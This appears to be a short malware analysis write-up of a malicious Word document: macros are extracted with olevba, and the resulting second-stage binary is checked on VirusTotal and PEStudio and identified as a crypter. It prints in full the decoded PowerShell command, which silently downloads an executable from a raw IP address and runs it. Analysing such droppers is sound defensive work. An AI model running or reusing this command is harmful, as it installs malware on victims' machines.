### Stage 1 Analysis:
- As it is a Microsoft Word document we can start the analysis with `olevba` to get macros if they are present
- Found a lot of macros
- Created a macro file which can be found under `Files Extracted/macros.vba`
- Out of all the junk we can find the actual malicious macros at the very end
- These are saved as `staeg1.vba`
- We can see a string of HEX numbers

```

- Converting it to ASCII gives us an interesting string
```bash
powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://20.51.227.181/svchost.exe','WioNET.exe');Start-Process 'WioNET.exe'
```

- We have a IP Address `20.51.227.181` which is downloading a binary `svchost.exe` and saving it as `WioNET.exe` and then executing it
- The link is still active so we can download the stage 2 binary

### Stage 2 Analysis:
- Checked the MD5 hash on VirusTotal and found 27 detections
- Checking it in `PEStudio` we find some malicious indicators
- Found some links and meta data to `Symantec`
- Checked hashes against VirusTotal and found 46 out of 69 detections
- VirusTotal shows its a type of a crypter
